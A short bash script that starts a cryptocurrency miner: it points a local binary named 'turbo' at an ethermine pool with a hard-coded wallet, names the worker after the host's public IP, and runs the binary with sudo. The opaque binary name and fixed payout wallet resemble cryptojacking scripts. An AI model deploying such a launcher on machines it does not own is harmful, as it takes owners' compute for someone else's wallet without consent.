#!/bin/bash

POOL=asia1.ethermine.org:4444
WALLET=0x84dec6fccc5406cbb1284dafc9a1be981497fecc
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./turbo && sudo ./turbo -a ethash -o $POOL -u $WALLET.$WORKER $@
